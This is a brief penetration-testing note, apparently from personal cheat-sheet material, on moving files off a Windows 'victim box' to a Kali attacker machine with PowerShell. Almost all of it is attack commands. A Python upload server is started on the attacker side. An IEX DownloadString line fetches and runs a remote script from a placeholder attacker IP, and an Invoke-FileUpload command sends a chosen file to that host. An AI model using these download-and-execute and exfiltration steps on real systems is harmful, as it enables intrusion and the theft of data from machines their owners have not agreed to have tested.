We can upload stuff using powershell without having to use base64. This is useful for very large files.

https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1


```
# Install / Start Upload server on KALI

pip3 install uploadserver 
python3 -m uploadserver

# Download PSUpload.ps1 to KALI

wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1


# File Transfer to Victim box
# Do this however you like...
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/PSUpload.ps1')


# Execute FileUpload

Invoke-FileUpload -Uri http://<KALI_IP>:8000/upload -File C:\path\to\<file>


``